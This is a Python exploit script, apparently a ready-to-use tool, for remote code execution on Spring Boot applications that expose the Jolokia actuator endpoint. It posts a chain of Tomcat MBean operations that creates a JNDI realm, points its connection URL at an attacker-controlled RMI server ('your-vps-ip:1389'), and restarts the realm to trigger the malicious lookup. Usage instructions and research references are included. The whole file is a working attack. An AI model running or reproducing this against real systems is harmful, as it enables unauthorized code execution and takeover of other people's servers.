#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import fire
from loguru import logger

import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Content-Type": "application/json",
}

create_realm = {
    "mbean": "Tomcat:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Tomcat:type=Engine"]
}

wirte_factory = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}

write_url = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": "rmi://your-vps-ip:1389/JNDIObject"
}

stop = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
}

start = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
}

flows = [create_realm, wirte_factory, write_url, stop, start]

class SpringBoot(object):
    """
    
    Usage:
        python3 springboot-realm-jndi-rce.py springboot_realm_jndi_rce --url http://127.0.0.1:8080
    """
    def __init__(self):
        pass

    def springboot_realm_jndi_rce(self, url, uri = '/jolokia'):
        """
        springboot realm jndi rce
        Reference:
            https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
            https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt
        """
        for flow in flows:
            logger.info(f"{flow['type'].title()} MBean {flow['mbean']}: {flow.get('operation', flow.get('attribute'))} ...")
            try:
                response = requests.post(url + uri, json = flow, headers = headers)
                response.json()
                logger.info(response.status_code)
            except Exception as e:
                logger.error(e)
                logger.error("Exploit failed")
                return False

    def main(self):
        url = 'http://127.0.0.1:8080'
        self.springboot_realm_jndi_rce(url)


if __name__ == "__main__":
    fire.Fire(SpringBoot)
